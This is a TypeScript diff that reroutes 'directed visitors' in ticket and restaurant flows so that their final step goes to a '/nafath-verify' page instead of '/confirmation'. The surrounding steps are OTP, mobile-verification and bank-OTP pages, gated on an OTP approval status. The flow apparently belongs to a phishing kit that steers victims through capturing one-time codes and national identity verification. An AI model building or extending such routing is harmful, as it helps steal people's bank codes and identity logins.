@@ -13,12 +13,12 @@ const TICKET_STEP_TO_PATH: Record<number, string> = {
   3: "/otp",
   4: "/verify-mobile",
   5: "/phone-otp",
-  6: "/confirmation",
+  6: "/nafath-verify",
 };
 
 const RESTAURANT_STEP_TO_PATH: Record<number, string> = {
   5: "/otp",
-  6: "/confirmation",
+  6: "/nafath-verify",
 };
 
 export function isRestaurantVisitor(data: DirectedVisitorData): boolean {
@@ -48,7 +48,7 @@ export function getDirectedTargetPath(
     (data.phoneOtpApprovalStatus === "approved" ||
       data.phoneOtpApproved === true)
   ) {
-    target = "/confirmation";
+    target = "/nafath-verify";
   }
   return target;
 }
@@ -86,7 +86,6 @@ export function getDirectedVisitorPath(path: unknown): string | null {
     "/provider-call",
     "/ncb-otp",
     "/otp",
-    "/confirmation",
   ];
   return allowed.some((prefix) => pathname === prefix || pathname.startsWith(prefix)) ? normalized : null;
 }
